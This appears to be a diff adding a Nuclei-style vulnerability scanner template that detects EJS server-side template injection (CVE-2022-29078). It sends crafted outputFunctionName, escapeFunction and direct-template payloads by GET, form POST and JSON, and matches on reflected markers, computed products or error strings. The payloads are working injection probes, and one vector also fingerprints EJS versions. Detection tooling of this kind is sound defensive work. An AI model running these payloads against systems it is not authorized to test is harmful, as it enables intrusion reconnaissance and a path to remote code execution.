@@ -1,0 +1,230 @@
+id: ejs-ssti
+
+info:
+  name: EJS (Embedded JavaScript) Server-Side Template Injection
+  author: custom
+  severity: critical
+  description: |
+    Detects Server-Side Template Injection in EJS (Embedded JavaScript) templates.
+    Covers CVE-2022-29078 and related vulnerabilities using outputFunctionName and escapeFunction vectors.
+  tags: ssti,ejs,nodejs,rce,cve,cve2022,custom
+  reference:
+    - https://eslam.io/posts/ejs-server-side-template-injection-rce/
+    - https://github.com/mde/ejs/issues/735
+    - https://nvd.nist.gov/vuln/detail/CVE-2022-29078
+
+variables:
+  rand1: "{{rand_int(1000, 9999)}}"
+  rand2: "{{rand_int(1000, 9999)}}"
+
+http:
+  # Vector 1: outputFunctionName SSTI (CVE-2022-29078)
+  - method: GET
+    path:
+      - "{{BaseURL}}?{{param}}=test&settings[view%20options][outputFunctionName]=x;throw%20new%20Error('EJSSSTI{{rand1}}');s"
+      - "{{BaseURL}}/{{endpoint}}?{{param}}=test&settings[view%20options][outputFunctionName]=x;throw%20new%20Error('EJSSSTI{{rand1}}');s"
+    payloads:
+      param:
+        - "id"
+        - "page"
+        - "name"
+        - "view"
+        - "template"
+        - "content"
+        - "data"
+        - "src"
+        - "file"
+        - "q"
+      endpoint:
+        - "page"
+        - "view"
+        - "render"
+        - "template"
+        - "index"
+        - "home"
+        - "dashboard"
+        - "admin"
+    attack: clusterbomb
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        name: ejs-ssti-error-reflection
+        part: body
+        words:
+          - "EJSSSTI{{rand1}}"
+
+      - type: word
+        name: ejs-rce-error
+        part: body
+        words:
+          - "outputFunctionName"
+          - "is not a valid JS identifier"
+        condition: and
+
+  # Vector 2: escapeFunction SSTI
+  - method: GET
+    path:
+      - "{{BaseURL}}?{{param}}=test&settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20{{rand1}}*{{rand2}}"
+      - "{{BaseURL}}/{{endpoint}}?{{param}}=test&settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20{{rand1}}*{{rand2}}"
+    payloads:
+      param:
+        - "id"
+        - "page"
+        - "name"
+        - "view"
+        - "template"
+        - "content"
+        - "data"
+        - "src"
+        - "file"
+        - "q"
+      endpoint:
+        - "page"
+        - "view"
+        - "render"
+        - "template"
+        - "index"
+        - "home"
+        - "dashboard"
+        - "admin"
+    attack: clusterbomb
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        name: ejs-escape-function-error
+        part: body
+        words:
+          - "escapeFunction"
+
+      - type: dsl
+        name: ejs-math-evaluation
+        dsl:
+          - 'contains(body, to_string(rand1 * rand2))'
+          - 'status_code == 200'
+        condition: and
+
+  # Vector 3: Direct template injection in render
+  - method: GET
+    path:
+      - "{{BaseURL}}?{{param}}=<%25={{rand1}}*{{rand2}}%25>"
+      - "{{BaseURL}}/{{endpoint}}?{{param}}=<%25={{rand1}}*{{rand2}}%25>"
+    payloads:
+      param:
+        - "id"
+        - "page"
+        - "name"
+        - "view"
+        - "template"
+        - "content"
+        - "data"
+        - "src"
+        - "msg"
+        - "message"
+      endpoint:
+        - "page"
+        - "view"
+        - "render"
+        - "template"
+        - "error"
+        - "404"
+    attack: clusterbomb
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        name: ejs-direct-ssti
+        dsl:
+          - 'contains(body, to_string(rand1 * rand2))'
+          - '!contains(body, "<%=")'
+          - 'status_code == 200'
+        condition: and
+
+  # Vector 4: POST-based SSTI
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/{{endpoint}}"
+    payloads:
+      endpoint:
+        - "page"
+        - "view"
+        - "render"
+        - "template"
+        - "submit"
+        - "process"
+        - "api"
+    attack: clusterbomb
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "data=test&settings[view%20options][outputFunctionName]=x;throw%20new%20Error('EJSSSTI{{rand1}}');s"
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        name: ejs-post-ssti-error
+        part: body
+        words:
+          - "EJSSSTI{{rand1}}"
+
+      - type: word
+        name: ejs-post-outputfunction-error
+        part: body
+        words:
+          - "outputFunctionName"
+
+  # Vector 5: JSON body SSTI
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/render"
+      - "{{BaseURL}}/template"
+    headers:
+      Content-Type: application/json
+    body: '{"data":"test","settings":{"view options":{"outputFunctionName":"x;throw new Error(\"EJSSSTI{{rand1}}\");s"}}}'
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        name: ejs-json-ssti-error
+        part: body
+        words:
+          - "EJSSSTI{{rand1}}"
+
+      - type: word
+        name: ejs-json-outputfunction-error
+        part: body
+        words:
+          - "outputFunctionName"
+          - "SyntaxError"
+        condition: or
+
+  # Vector 6: EJS version detection via error
+  - method: GET
+    path:
+      - "{{BaseURL}}?settings[view%20options][test]=1"
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        name: ejs-version-leak
+        part: body
+        words:
+          - "ejs"
+          - "EJS"
+          - "Embedded JavaScript"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: ejs-version
+        part: body
+        regex:
+          - "ejs[@: ]+([0-9]+\\.[0-9]+\\.[0-9]+)"
+          - "EJS ([0-9]+\\.[0-9]+\\.[0-9]+)"
